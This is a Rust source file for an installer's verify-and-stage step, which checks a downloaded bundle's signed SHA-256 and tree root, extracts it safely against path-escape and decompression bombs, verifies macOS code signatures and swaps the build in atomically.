// Copyright 2026 Andrew Yates
// SPDX-License-Identifier: Apache-2.0

//! The verify-and-stage chain (§8/§9): turning a downloaded bundle into a verified,
//! ready-to-activate store build.
//!
//! This is the integrity heart of an install, independent of *how* the bytes were
//! fetched (the network fetch reuses `aterm-update-core`'s `download_to`; the manifest
//! was already root/release-signature-verified upstream, §8). Given the signed
//! [`Artifact`] and a downloaded archive on disk, [`verify_and_stage`] enforces, in order:
//!
//! 1. **Download integrity** — the COMPRESSED asset's SHA-256 equals the signed
//!    `artifact.sha256`. A corrupted/substituted download is refused before extraction.
//! 2. **Slip-safe staging** — into a scratch SIBLING of the build dir, through the lane
//!    the signed row's `payload` names ([`stage_payload`]): the historical `.tar.zst`
//!    extraction for a release bundle, or one of the `https` protocol lanes (`tar-zst` /
//!    `tar-gz` / `zip` archives with `strip_components` and in-root symlinks, a
//!    `raw-binary` that becomes `bin/<entry>`, a `dmg` whose single `.app` is copied
//!    out of the mounted image), then the row's `links` as relative symlinks under
//!    `bin/`. Every archive entry is vetted before a byte is written and size-capped from
//!    the signed `disk_installed`. The live tree is never extracted over.
//! 3. **Apply-time re-verify (TOCTOU)** — the extracted tree's [`crate::tree::tree_root`]
//!    equals the signed `artifact.tree_root` (when the producer set one). An already-
//!    extracted tree can't be re-checked against the compressed `sha256`, so this closes
//!    the extract→activate window: a file swapped post-extraction moves the root.
//!    The root is folded BY THE EXTRACTOR as it writes
//!    ([`crate::extract::extract_tar_zst_rooted`]) instead of by re-reading the whole
//!    payload back off disk — see [`verify_and_stage`] step 3 for exactly which bytes
//!    that still proves and which window it gives up.
//! 4. **Durability, then an atomic swap with rollback** — the staged tree's file contents
//!    and directory entries are flushed FIRST ([`crate::store::sync_tree`]): a rename is
//!    metadata, so without that flush a power loss can leave the swap and the completeness
//!    marker durable over file data that was never written back. Only then is a tree that
//!    passed every check above renamed into `build_dir`, and only then is the build marked
//!    complete — durably too, so a marker whose NAME survives a crash can never vouch for
//!    contents that did not.
//! 5. **Caller hooks** ([`StageHooks`]) — a gate over the verified tree before anything
//!    publishes it (the darwin Developer ID check, [`developer_id_gate`]), and sidecars
//!    written durably after the swap and before the marker, so a marked build has them.
//!
//! Any failure removes the scratch tree and returns fail-closed — a half- or wrongly-staged
//! build never reaches activation, and **a stage that cannot install the new build must not
//! have uninstalled the old one**.

use std::collections::BTreeMap;
use std::path::{Component, Path, PathBuf};

use crate::extract::{
    ExtractError, ExtractOptions, TreeAccumulator, extract_tar_gz_tree, extract_tar_zst_tree,
    extract_zip_tree,
};
use crate::manifest::Artifact;
use crate::tree::{file_sha256, tree_root};

/// Opt-in belt-and-suspenders, a DEVELOPMENT SEAM (`aterm_types::dev_seam!` — a shipped
/// binary does not read it): when this is set to a non-empty value, [`verify_and_stage`]
/// ALSO walks the staged tree with [`crate::tree::tree_root`] and refuses the stage unless
/// the walk agrees with the root the extractor folded.
///
/// It exists so the fused digest's equivalence is checkable over real bundles — not only
/// over the unit corpus in `extract.rs` — by a developer chasing a suspected filesystem
/// fault with a dev build. It is OFF by default because turning it on restores exactly
/// the cost this module stopped paying: a second full pass over the uncompressed payload
/// (3.44 GB for the shipped `trust` member). `aterm pkg verify` re-attests installed
/// bytes in every build.
const DISK_REVERIFY_ENV: &str = "ATPKG_STAGE_DISK_REVERIFY";

/// Why staging a downloaded bundle failed. Each aborts the stage fail-closed.
#[derive(Debug)]
pub enum StageError {
    /// I/O while hashing / preparing the staging dir.
    Io(std::io::Error),
    /// The compressed asset's SHA-256 did not match the signed `artifact.sha256`.
    Sha256Mismatch { expected: String, got: String },
    /// Extraction failed (tar-slip escape, size cap, or tar/zstd error).
    Extract(ExtractError),
    /// The extracted tree's `tree_root` did not match the signed `artifact.tree_root`.
    TreeRootMismatch { expected: String, got: String },
    /// An `https` payload could not be laid down as the row describes: an unknown
    /// `payload` lane, an inadmissible `entry`/`links` name or target, a `links` target
    /// missing from the staged tree, or the `dmg` tooling (`hdiutil`/`ditto`)
    /// refusing the image. Names the field or tool, so a mis-authored row fails fast on
    /// the authoring machine.
    Payload(String),
    /// The staged tree's platform signer check refused it: a Mach-O not signed by the
    /// pinned Developer ID team, no Mach-O at all, an exposed tool's entry that is not a
    /// verified Mach-O, or a shape that would let code escape the check (an interpreter
    /// script, a symlinked Mach-O) ([`developer_id_gate`]). Deterministic for these bytes,
    /// which already matched their digest, so it is memoized like a digest refusal.
    SignerRefused(String),
}

// Hand-rendered through `Formatter::write_str` + direct `Display::fmt` calls (no
// `write!`): the `write!`/`format_args!` expansion embeds `fmt::Arguments`
// construction (with inlined `unsafe`) that the strict Trust gate cannot lower and
// fails closed on. Byte-identical output (`write!` with `{}` args performs exactly
// these formatter writes in sequence; no width/fill flags are used).
impl std::fmt::Display for StageError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            StageError::Io(e) => {
                f.write_str("io: ")?;
                std::fmt::Display::fmt(e, f)
            }
            StageError::Sha256Mismatch { expected, got } => {
                f.write_str("asset sha256 mismatch: expected ")?;
                f.write_str(expected)?;
                f.write_str(", got ")?;
                f.write_str(got)
            }
            StageError::Extract(e) => {
                f.write_str("extract: ")?;
                std::fmt::Display::fmt(e, f)
            }
            StageError::TreeRootMismatch { expected, got } => {
                f.write_str("tree_root mismatch: expected ")?;
                f.write_str(expected)?;
                f.write_str(", got ")?;
                f.write_str(got)
            }
            StageError::Payload(m) => {
                f.write_str("payload: ")?;
                f.write_str(m)
            }
            StageError::SignerRefused(m) => {
                f.write_str("signer refused: ")?;
                f.write_str(m)
            }
        }
    }
}

impl std::error::Error for StageError {}

/// A stage's pre-swap hook: examines the verified `.incoming` tree.
pub(crate) type PreSwapHook<'a> = &'a dyn Fn(&Path) -> Result<(), StageError>;

/// A stage's sidecar hook: given the folded `tree_root`, the `(suffix, bytes)` sidecars to
/// write beside the build — or the refusal that stops the stage before the swap.
pub(crate) type SidecarHook<'a> =
    &'a dyn Fn(&str) -> Result<Vec<(&'static str, Vec<u8>)>, StageError>;

/// Caller steps inside [`verify_and_stage`]. [`StageHooks::NONE`] runs none and stages
/// exactly as a stage without hooks.
#[derive(Clone, Copy, Default)]
pub struct StageHooks<'a> {
    /// Run on the `.incoming` tree after the digest and `tree_root` checks and before
    /// anything flushes or publishes it; an `Err` refuses the stage with nothing swapped,
    /// marked or recorded.
    pub pre_swap: Option<PreSwapHook<'a>>,
    /// Asked once the tree is verified; each `(suffix, bytes)` is written durably as
    /// `<build><suffix>` after the swap and before `.ready`, so `.ready` implies every
    /// sidecar exists. A suffix outside [`crate::store::STAGE_SIDECAR_SUFFIXES`] refuses
    /// the stage before the swap.
    pub sidecars: Option<SidecarHook<'a>>,
}

impl StageHooks<'_> {
    /// No hooks.
    pub const NONE: StageHooks<'static> = StageHooks {
        pre_swap: None,
        sidecars: None,
    };
}

/// Uncompressed-size cap for extraction: twice the signed `disk_installed` (tolerating
/// block-rounding) but at least 1 MiB, so a decompression bomb is bounded by the *signed*
/// size, never an attacker-chosen tar header. A `disk_installed` of 0 (older/loose
/// manifest) falls back to a 2 GiB ceiling rather than unbounded.
fn size_cap(artifact: &Artifact) -> u64 {
    let signed = artifact.cost.disk_installed;
    if signed == 0 {
        2u64 << 30
    } else {
        signed.saturating_mul(2).max(1 << 20)
    }
}

/// The maximum entry count — a tar-bomb (millions of tiny entries) guard well above any
/// real toolchain bundle.
const MAX_ENTRIES: u64 = 4_000_000;

/// Verify a downloaded `archive` against the signed `artifact` and stage it at
/// `build_dir` (see the module docs). On success `build_dir` holds the verified,
/// ready-to-activate tree. On any failure the partial tree is removed and the error
/// returned fail-closed — and, crucially, **whatever was installed at `build_dir` before
/// the call is still installed and still marked complete**.
///
/// # Why this stages beside the build instead of into it
///
/// The previous shape was `remove_dir_all(build_dir)` → extract → verify → mark. Three
/// things follow from deleting first, and all three were real:
///
/// * **The live tree died at the first byte of extraction.** Re-installing an
///   already-present build (a repair, a re-run, a `decide()` that re-Installs) destroyed a
///   working toolchain before it had a verified replacement; any failure after that point
///   — bad archive, disk full, Ctrl-C — left the user with nothing.
/// * **The completeness marker survived the delete.** It is a SIBLING file
///   (`<build>.ready`, deliberately outside the hashed tree), so `remove_dir_all` did not
///   touch it: after an interrupted stage the store still answered "build N is installed"
///   for a tree that was gone or half-written, and `decide()` therefore never repaired it.
/// * **The debris was unreclaimable.** A marker-less build dir is invisible to
///   `list_installed`, and GC only reclaims what `list_installed` returns, so an
///   interrupted install leaked its partial tree until someone deleted it by hand.
///
/// Now the tree is built in a scratch sibling and only becomes `build_dir` once it has
/// passed every check, and the marker is cleared for the duration of the swap. Crash at
/// any point and the store is left in one of exactly two honest states: the OLD build,
/// complete; or NO build, unmarked and therefore re-installable.
///
/// Returns the `tree_root` folded while staging (the verified one when the row signs
/// one). A tracked installer's tree carries `com.apple.provenance` like every file it
/// writes; the store heal its door ends with clears it ([`crate::provenance::heal_store`]).
pub fn verify_and_stage(
    artifact: &Artifact,
    archive: &Path,
    build_dir: &Path,
    hooks: &StageHooks<'_>,
) -> Result<String, StageError> {
    // 1. Download integrity — the compressed asset's sha256 must match the signed value,
    //    BEFORE we spend any work extracting it.
    let got = file_sha256(archive).map_err(StageError::Io)?;
    if !got.eq_ignore_ascii_case(&artifact.sha256) {
        return Err(StageError::Sha256Mismatch {
            expected: artifact.sha256.clone(),
            got,
        });
    }

    // 2. Extract into a scratch SIBLING (tar-slip-safe, size-capped from the signed size).
    //    The live tree is untouched throughout. Any scratch left by a killed earlier run is
    //    swept first — the store lock makes it ours to reclaim.
    crate::store::sweep_stage_scratch(build_dir);
    let incoming = crate::store::incoming_dir(build_dir).ok_or_else(|| {
        StageError::Io(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            "build dir has no name",
        ))
    })?;
    std::fs::create_dir_all(&incoming).map_err(StageError::Io)?;
    //    The stage hands back the `tree_root` of what it wrote, folded from the bytes
    //    as they went past (see [`crate::extract::extract_tar_zst_rooted`]). This is
    //    the ONE pass over the uncompressed payload: the digest step 3 compares is a
    //    by-product of the writing, not a second reading of it. (The `dmg` lane is
    //    the exception — `ditto` wrote its bytes, so it walks them once.)
    let extracted_root = match stage_payload(artifact, archive, &incoming) {
        Ok(root) => root,
        Err(e) => {
            let _ = std::fs::remove_dir_all(&incoming);
            return Err(e);
        }
    };

    // 3. Apply-time re-verify (TOCTOU): the extracted tree must match the signed tree_root
    //    (when the producer emitted one). A mismatch — tamper or partial extract — aborts,
    //    and the previously-installed build is still there, untouched.
    //
    //    WHAT THIS STILL PROVES, EXACTLY. The digest now describes the bytes the extractor
    //    WROTE rather than the bytes a subsequent walk READ BACK. Both forms refuse:
    //      * a substituted or corrupt archive — the compressed `sha256` gate in step 1
    //        already ran, and this catches anything that survives it;
    //      * a truncated, partial or aborted extraction (short files move the root);
    //      * a bundle whose laid-down layout, modes or contents differ in any way from the
    //        one the publisher signed — that is the whole point, and it is unchanged.
    //    WHAT IT GIVES UP is one thing: a mutation landing in the window BETWEEN the write
    //    and the read, inside the `0700` staging scratch, while this process holds the
    //    store lock. That window was microseconds wide, it is not the threat the private
    //    prefix is hardened against (see the module docs), and the price of keeping it was
    //    re-reading the entire payload — 3.44 GB for the shipped `trust` member, issued
    //    straight after 3.44 GB of dirty writeback.
    //
    //    The byte format is a CROSS-VERSION contract (signed manifests embed roots computed
    //    by earlier releases), so the two producers share one formatter and one fold
    //    (`tree::entry_line` / `tree::root_of_entry_lines`) and an exhaustive parity test
    //    pins them together (`extract.rs`,
    //    `fused_tree_root_is_byte_identical_to_the_on_disk_walk`). The
    //    `ATPKG_STAGE_DISK_REVERIFY` development seam re-arms the on-disk walk as a
    //    cross-check in a dev build, and `atpkg verify`
    //    — the surface whose claim really IS "what is on disk right now" — still walks the
    //    tree, unchanged.
    let root = if artifact.tree_root.is_empty() {
        extracted_root
    } else {
        let got = match reverified_root(&incoming, extracted_root, disk_reverify_armed()) {
            Ok(r) => r,
            Err(e) => {
                let _ = std::fs::remove_dir_all(&incoming);
                return Err(StageError::Io(e));
            }
        };
        if !got.eq_ignore_ascii_case(&artifact.tree_root) {
            let _ = std::fs::remove_dir_all(&incoming);
            return Err(StageError::TreeRootMismatch {
                expected: artifact.tree_root.clone(),
                got,
            });
        }
        got
    };

    // 3a. THE CALLER'S GATE AND RECORDS, on the verified tree and before anything
    //     publishes it: a refusal here leaves no build, no marker and no sidecar. The
    //     sidecars are rendered now so a bad suffix refuses before the swap too; they are
    //     written after it.
    if let Some(pre_swap) = hooks.pre_swap
        && let Err(e) = pre_swap(&incoming)
    {
        let _ = std::fs::remove_dir_all(&incoming);
        return Err(e);
    }
    let sidecars = match hooks.sidecars.map(|render| render(&root)).transpose() {
        Ok(sidecars) => sidecars.unwrap_or_default(),
        Err(e) => {
            let _ = std::fs::remove_dir_all(&incoming);
            return Err(e);
        }
    };
    if let Some((suffix, _)) = sidecars
        .iter()
        .find(|(suffix, _)| !crate::store::STAGE_SIDECAR_SUFFIXES.contains(suffix))
    {
        let _ = std::fs::remove_dir_all(&incoming);
        return Err(payload2(
            "sidecar suffix the store does not reclaim: ",
            suffix,
        ));
    }

    // 3b. DURABILITY, before anything publishes this tree. Every check above is about the
    //     bytes this process WROTE; none of them is about bytes the filesystem has
    //     COMMITTED. The swap below is renames, and a rename is metadata: on a
    //     delayed-allocation filesystem (ext4's default) the directory entries for
    //     `<build>/` and the `<build>.ready` marker beside it can reach the journal while
    //     the gigabytes behind them are still page cache. A power loss in that window left
    //     the store saying "build N is complete" over zero-length or truncated files — a
    //     state nothing repairs, because `decide` then answers `UpToDate` and the swap has
    //     already reclaimed the tree it superseded. So the CONTENTS go down first, and the
    //     names that vouch for them only afterwards.
    if let Err(e) = crate::store::sync_tree(&incoming) {
        let _ = std::fs::remove_dir_all(&incoming);
        return Err(StageError::Io(e));
    }

    // 4. SWAP. Marker down first (mid-swap, the build is honestly not complete), then the
    //    old tree aside, then the verified tree into place, then the old tree reclaimed.
    if let Err(e) = swap_into_place(build_dir, &incoming) {
        let _ = std::fs::remove_dir_all(&incoming);
        return Err(StageError::Io(e));
    }

    // 4b. THE CALLER'S SIDECARS, durably, then the directory that names them: `.ready`
    //     below implies each one exists. A write that fails leaves the verified tree
    //     unmarked, re-stageable.
    if !sidecars.is_empty() {
        for (suffix, bytes) in &sidecars {
            crate::store::write_sidecar_durably(build_dir, suffix, bytes)
                .map_err(StageError::Io)?;
        }
        if let Some(parent) = build_dir.parent() {
            crate::store::sync_dir(parent);
        }
    }

    // 5. Mark the build COMPLETE — the last step, written atomically AFTER the tree_root
    //    re-verify (so the marker itself is never part of the hashed tree) and after the
    //    swap. Its presence is what distinguishes a fully-installed build from one left
    //    partial by a crash; `list_installed` skips marker-less build dirs so such a
    //    partial is re-installed, not treated as up-to-date.
    if let Err(e) = crate::store::mark_build_ready(build_dir) {
        // LEAVE THE TREE. By this point the swap has succeeded and the outgoing tree has
        // already been reclaimed, so deleting the new one is the single enumerated path
        // that ends with NEITHER the old build nor the new — the exact state the module
        // invariant forbids, reached by a 3-byte write failing (realistically: the volume
        // is full, which is precisely the condition this module exists for), and reached
        // with a `current` link already naming this build when a live build was re-staged.
        //
        // The tree on disk passed every check above, so keeping it is not keeping a
        // partial: it is the verified toolchain, honestly UNMARKED. `list_installed` skips
        // marker-less dirs and `flow::installed_for_decide` drops one from the apply
        // decision (the shim view alone would call it up to date forever, even here where
        // its shims still resolve), so it reads as not-installed to the readers AND to
        // `decide`, and the next run re-stages it; a `current` link that named this build
        // still resolves to correct bytes instead of dangling. The old "take the tree with it so the next run stages cleanly rather
        // than extracting over a stranger" reasoning belonged to the delete-then-extract
        // flow — nothing extracts into `build_dir` any more, it is swapped onto, so an
        // unmarked leftover is never extracted over. It is also fully reclaimable: the next
        // stage renames it aside and deletes it, and `gc`'s partial arm sweeps it once
        // nothing claims it.
        return Err(StageError::Io(e));
    }
    if let Some(parent) = build_dir.parent() {
        crate::store::sync_dir(parent);
    }
    Ok(root)
}

/// How long [`developer_id_gate`] may spend verifying one tree, across every Mach-O in
/// it: each codesign call is bounded on its own, and this bounds their number.
const DEVELOPER_ID_BUDGET: std::time::Duration = std::time::Duration::from_secs(120);

/// A [`StageHooks::pre_swap`] gate for a darwin agent build: every Mach-O in the staged
/// tree ([`crate::macho::find_macho`], by magic, regular files only, no interpreter
/// script) must verify as signed by Developer ID `team` (`check`, production:
/// [`codesign_team_check`]), there must be at least one, each exposed tool's
/// `bin/<tool>` — what its shim runs — must be one of them, and no other file may carry
/// an execute bit. Off macOS there is no platform anchor and it passes.
///
/// codesign's verdict on these bytes ([`CodesignError::is_verdict`]) is
/// [`StageError::SignerRefused`]; a team or tool name that is not one is a
/// [`StageError::Payload`]; codesign failing to judge them (an unreadable file, an
/// internal error, a timeout) is [`StageError::Io`] — a fact about this machine, retried
/// rather than memoized.
///
/// [`CodesignError::is_verdict`]: aterm_update_core::codesign::CodesignError::is_verdict
pub(crate) fn developer_id_gate(
    team: &str,
    exposes: &[&str],
    check: TeamCheck,
) -> impl Fn(&Path) -> Result<(), StageError> + use<> {
    let team = team.to_string();
    let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
    move |tree: &Path| {
        if !cfg!(target_os = "macos") {
            return Ok(());
        }
        let verify = |path: &Path, deadline: std::time::Instant| check(path, &team, deadline);
        check_developer_id(tree, &team, &exposes, &verify)
    }
}

/// How [`developer_id_gate`] judges one Mach-O against a team by a deadline.
pub(crate) type TeamCheck =
    fn(&Path, &str, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;

/// The real [`TeamCheck`]: `/usr/bin/codesign` under the pinned Developer ID requirement.
///
/// # Errors
/// codesign's verdict, or its failure to give one.
pub(crate) fn codesign_team_check(
    path: &Path,
    team: &str,
    deadline: std::time::Instant,
) -> Result<(), aterm_update_core::codesign::CodesignError> {
    aterm_update_core::codesign::verify_developer_id_until(path, team, false, deadline)
}

/// One Mach-O's Developer ID check, finished by the deadline.
type VerifyOne<'a> =
    &'a dyn Fn(&Path, std::time::Instant) -> Result<(), aterm_update_core::codesign::CodesignError>;

/// [`developer_id_gate`]'s rules over `tree`, with each Mach-O checked by `verify`.
fn check_developer_id(
    tree: &Path,
    team: &str,
    exposes: &[String],
    verify: VerifyOne<'_>,
) -> Result<(), StageError> {
    use aterm_update_core::codesign::{CodesignError, VERIFY_TIMEOUT};
    if exposes.is_empty() {
        return Err(payload2(
            "developer id gate: no exposed tool to bind for team ",
            team,
        ));
    }
    let found = crate::macho::find_macho(tree)?;
    if found.is_empty() {
        let mut m = String::from("no Mach-O in the staged tree; a darwin build must carry ");
        m.push_str("at least one, signed by Developer ID team ");
        m.push_str(team);
        return Err(StageError::SignerRefused(m));
    }
    // What each shim runs must be a verified Mach-O, or a decoy beside it satisfies the
    // floor while the entry runs unchecked.
    for name in exposes {
        let Some(tool) = crate::store::ToolName::new(name) else {
            return Err(payload2("developer id gate: not a tool name: ", name));
        };
        let entry = tree.join("bin").join(tool.exe_file());
        if !found.contains(&entry) {
            let mut m = String::from("bin/");
            m.push_str(&tool.exe_file());
            m.push_str(" is not a Mach-O in the staged tree; its shim would run it unverified");
            return Err(StageError::SignerRefused(m));
        }
    }
    // Any execute bit sits on a verified Mach-O: a text file carrying one runs through
    // `/bin/sh`, signature unchecked.
    if let Some(stray) = crate::macho::executable_files(tree)?
        .into_iter()
        .find(|p| !found.contains(p))
    {
        let mut m = stray
            .strip_prefix(tree)
            .unwrap_or(&stray)
            .to_string_lossy()
            .into_owned();
        m.push_str(" is executable but not a Mach-O; it would run unverified");
        return Err(StageError::SignerRefused(m));
    }
    let budget = std::time::Instant::now() + DEVELOPER_ID_BUDGET;
    for path in &found {
        let deadline = budget.min(std::time::Instant::now() + VERIFY_TIMEOUT);
        let rel = path.strip_prefix(tree).unwrap_or(path).to_string_lossy();
        let mut m = String::from(rel.as_ref());
        match verify(path, deadline) {
            Ok(()) => {}
            Err(e) if e.is_verdict() => {
                m.push_str(" is not signed by Developer ID team ");
                m.push_str(team);
                m.push_str(": ");
                m.push_str(&e.to_string());
                return Err(StageError::SignerRefused(m));
            }
            Err(e @ CodesignError::InvalidTeam(_)) => {
                return Err(payload2("developer id gate: ", &e.to_string()));
            }
            Err(e) => {
                m.push_str(": ");
                m.push_str(&e.to_string());
                return Err(StageError::Io(std::io::Error::other(m)));
            }
        }
    }
    Ok(())
}

/// Lay the verified download at `archive` down under `dest` in the shape
/// `artifact.payload` names, and return the `tree_root` of what was laid down.
///
/// THE ONE PRODUCER of a staged tree, shared by the client stage ([`verify_and_stage`],
/// step 2) and the authoring ceremony: the tool that writes a signed row's `tree_root`
/// must stage through THIS function over the same download, or the two roots disagree
/// by construction — the normalizations below (mode sanitizing, `strip_components`,
/// the `links` shape, which `.app` is copied) are not something a second implementation
/// can be trusted to reproduce. Lanes, by `payload`:
///
/// * `""` — a release bundle (`binary` / `sysroot-bundle`): `.tar.zst`, symlinks
///   refused, nothing stripped — byte-for-byte the historical extraction;
/// * `tar-zst` / `tar-gz` / `zip` — a vendor archive: `strip_components` applied and
///   in-root symlinks admitted ([`crate::extract::ExtractOptions`]), modes sanitized to
///   `0755`/`0644` exactly as for a release bundle;
/// * `raw-binary` — the download IS the binary: it becomes `bin/<entry>`, mode `0755`;
/// * `dmg` — the single `.app` at the image root, copied with `ditto` (mode bits
///   PRESERVED, not sanitized: the bundle is the vendor's, signed and notarized as
///   laid out), macOS only.
///
/// Then, for every lane, the row's `links` are created as RELATIVE symlinks
/// `bin/<name> -> ../<target>` ([`apply_links`]) so the shims resolve `bin/<tool>`. The
/// root is folded from what was written for the archive and raw lanes; the `dmg`
/// lane walks the finished tree once (its bytes were laid by `ditto`, not by this
/// process's write loop).
///
/// `dest` must be an empty (or absent) directory the caller owns — the fold's
/// precondition, enforced by every lane. On error the caller removes `dest`.
///
/// # Errors
/// [`StageError::Extract`] for anything the extractor refused (a slip, a cap, a
/// malformed container), [`StageError::Payload`] for a row the lane cannot honour, and
/// [`StageError::Io`] for the filesystem.
pub fn stage_payload(
    artifact: &Artifact,
    archive: &Path,
    dest: &Path,
) -> Result<String, StageError> {
    let cap = size_cap(artifact);
    let vendor = ExtractOptions {
        strip_components: artifact.strip_components,
        in_root_symlinks: true,
    };
    let mut folded: Option<TreeAccumulator> = match artifact.payload.as_str() {
        "" => Some(
            extract_tar_zst_tree(archive, dest, cap, MAX_ENTRIES, ExtractOptions::default())
                .map_err(StageError::Extract)?,
        ),
        "tar-zst" => Some(
            extract_tar_zst_tree(archive, dest, cap, MAX_ENTRIES, vendor)
                .map_err(StageError::Extract)?,
        ),
        "tar-gz" => Some(
            extract_tar_gz_tree(archive, dest, cap, MAX_ENTRIES, vendor)
                .map_err(StageError::Extract)?,
        ),
        "zip" => Some(
            extract_zip_tree(archive, dest, cap, MAX_ENTRIES, vendor)
                .map_err(StageError::Extract)?,
        ),
        "raw-binary" => Some(stage_raw_binary(archive, dest, &artifact.entry, cap)?),
        "dmg" => {
            stage_dmg(archive, dest)?;
            None
        }
        other => return Err(payload2("unknown payload lane: ", other)),
    };
    apply_links(dest, &artifact.links, folded.as_mut())?;
    match folded {
        Some(tree) => Ok(tree.root()),
        None => tree_root(dest).map_err(StageError::Io),
    }
}

/// A [`StageError::Payload`] from `<head><detail>` (manual concat — see `lib.rs` on
/// `format!`).
fn payload2(head: &str, detail: &str) -> StageError {
    let mut m = String::from(head);
    m.push_str(detail);
    StageError::Payload(m)
}

/// The `raw-binary` lane: the download becomes `bin/<entry>` at mode `0755` — under the
/// platform's EXECUTABLE spelling of the logical name (`bin/claude` on Unix,
/// `bin/claude.exe` on Windows: [`crate::store::ToolName::exe_file`], the file the shim
/// forwards to) — through the very write loop the archive lanes use, so the one file
/// folds into the digest exactly as an archived `bin/<entry>` would.
fn stage_raw_binary(
    archive: &Path,
    dest: &Path,
    entry: &str,
    cap: u64,
) -> Result<TreeAccumulator, StageError> {
    // Belt and braces over `vendor::check_row` (which the client ran before download):
    // this function is also the AUTHORING producer, and a separator here would be a
    // path, not a name.
    let Some(tool) = crate::store::ToolName::new(entry) else {
        return Err(payload2(
            "raw-binary entry is not a single admissible tool name: ",
            entry,
        ));
    };
    std::fs::create_dir_all(dest).map_err(StageError::Io)?;
    crate::extract::require_empty_destination(dest).map_err(StageError::Extract)?;
    let bin = dest.join("bin");
    refuse_symlinked_bin(&bin)?;
    std::fs::create_dir_all(&bin).map_err(StageError::Io)?;
    crate::platform::set_mode(&bin, 0o755).map_err(StageError::Io)?;
    let target = bin.join(tool.exe_file());
    let file = std::fs::File::open(archive).map_err(StageError::Io)?;
    let written =
        crate::extract::stage_file(file, &target, 0o755, cap).map_err(StageError::Extract)?;
    let mut tree = TreeAccumulator::new();
    let rel = crate::extract::rel_bytes_under(dest, &target).map_err(StageError::Extract)?;
    tree.record_file(rel, written.mode, written.content_sha_hex);
    Ok(tree)
}

/// Whether a `links` TARGET is admissible here: a relative, `..`-free, `.`-free,
/// separator-clean path (the same rule `vendor::check_row` applied to the signed row;
/// repeated because this is also the authoring producer).
fn link_target_admissible(target: &str) -> bool {
    if target.is_empty()
        || target.starts_with('/')
        || target.ends_with('/')
        || target.contains('\0')
        || target.contains('\\')
    {
        return false;
    }
    target
        .split('/')
        .all(|seg| !seg.is_empty() && seg != "." && seg != "..")
        && Path::new(target)
            .components()
            .all(|c| matches!(c, Component::Normal(_)))
}

/// Refuse a staged `bin` that exists as anything but a real directory. `create_dir_all`,
/// `set_mode` and the link creation after them all FOLLOW a `bin` symlink, so a staged
/// `bin -> <anywhere>` would chmod that directory and plant links in it, outside the stage
/// (audit K1, 2026-09-12). The extractor's vet keeps every in-root link inside the root;
/// this refuses the shape outright, whatever laid it.
fn refuse_symlinked_bin(bin: &Path) -> Result<(), StageError> {
    match std::fs::symlink_metadata(bin) {
        Ok(m) if !m.is_dir() => Err(StageError::Payload(String::from(
            "links: the staged `bin` is a symlink or a file, not a directory",
        ))),
        _ => Ok(()),
    }
}

/// Whether any proper ancestor of `dest/<target>` below `dest` is a symlink — the probe
/// and the link would then be answered by a tree the digest does not describe.
fn target_ancestor_is_symlink(dest: &Path, target: &str) -> bool {
    let mut cur = dest.to_path_buf();
    let mut comps = Path::new(target).components().peekable();
    while let Some(c) = comps.next() {
        if comps.peek().is_none() {
            break;
        }
        cur.push(c);
        if std::fs::symlink_metadata(&cur).is_ok_and(|m| m.is_symlink()) {
            return true;
        }
    }
    false
}

/// Create the row's `links`: for every `(name, target)`, the RELATIVE symlink
/// `bin/<name> -> ../<target>`, and record it in the open fold (when there is one) so
/// the root closes over the finished tree. Fail-closed on a name that is not a tool
/// name, a target that is not a clean relative path, a target absent from the staged
/// tree (an authoring slip: the link would dangle), a target reached through a symlinked
/// directory, a staged `bin` that is not a real directory ([`refuse_symlinked_bin`]), or a
/// `bin/<name>` something already occupies (the link would either fail or shadow an
/// extracted entry).
fn apply_links(
    dest: &Path,
    links: &BTreeMap<String, String>,
    mut tree: Option<&mut TreeAccumulator>,
) -> Result<(), StageError> {
    if links.is_empty() {
        return Ok(());
    }
    let bin = dest.join("bin");
    refuse_symlinked_bin(&bin)?;
    for (name, target) in links {
        if crate::store::ToolName::new(name).is_none() {
            return Err(payload2(
                "links name is not an admissible tool name: ",
                name,
            ));
        }
        if !link_target_admissible(target) {
            return Err(payload2(
                "links target must be a relative, `..`-free path inside the staged tree: ",
                target,
            ));
        }
        if target_ancestor_is_symlink(dest, target) {
            return Err(payload2(
                "links target passes through a symlinked directory: ",
                target,
            ));
        }
        if std::fs::symlink_metadata(dest.join(target)).is_err() {
            return Err(payload2("links target is not in the staged tree: ", target));
        }
        std::fs::create_dir_all(&bin).map_err(StageError::Io)?;
        crate::platform::set_mode(&bin, 0o755).map_err(StageError::Io)?;
        let link = bin.join(name);
        if std::fs::symlink_metadata(&link).is_ok() {
            return Err(payload2(
                "links name collides with a staged entry: bin/",
                name,
            ));
        }
        let mut rel_target = PathBuf::from("..");
        rel_target.push(target);
        crate::extract::create_symlink(&rel_target, &link).map_err(StageError::Io)?;
        if let Some(tree) = tree.as_deref_mut() {
            let rel = crate::extract::rel_bytes_under(dest, &link).map_err(StageError::Extract)?;
            let target_bytes = crate::call1(crate::platform::os_str_bytes, rel_target.as_os_str());
            tree.record_symlink(rel, target_bytes);
        }
    }
    Ok(())
}

/// The mount point for a `dmg` stage: a SIBLING of `dest` named `<dest>.mnt`. The
/// name is deliberately outside every scratch recogniser (`store::stage_scratch_of`
/// wants `<n>.incoming-<digits>`), so neither the store sweep nor GC will ever
/// `remove_dir_all` a directory that may be a live mount; the [`Mount`] guard is what
/// reclaims it, on every path.
#[cfg(target_os = "macos")]
fn dmg_mount_point(dest: &Path) -> Result<PathBuf, StageError> {
    let name = crate::call1(std::path::Path::file_name, dest)
        .and_then(|n| crate::call1(std::ffi::OsStr::to_str, n))
        .ok_or_else(|| {
            payload2(
                "dmg stage dir has no name: ",
                &crate::call1(std::path::Path::to_string_lossy, dest),
            )
        })?;
    let mut mnt = String::from(name);
    mnt.push_str(".mnt");
    Ok(dest.with_file_name(mnt))
}

/// Run `/usr/bin/<tool>` to completion with no stdin; a non-zero exit is a
/// [`StageError::Payload`] naming the tool and the tail of its stderr.
#[cfg(target_os = "macos")]
fn run_tool(tool: &str, args: &[&std::ffi::OsStr]) -> Result<(), StageError> {
    let mut path = String::from("/usr/bin/");
    path.push_str(tool);
    let out = std::process::Command::new(&path)
        .args(args)
        .stdin(std::process::Stdio::null())
        .output()
        .map_err(StageError::Io)?;
    if out.status.success() {
        return Ok(());
    }
    Err(tool_failed(tool, out.status.code(), &out.stderr))
}

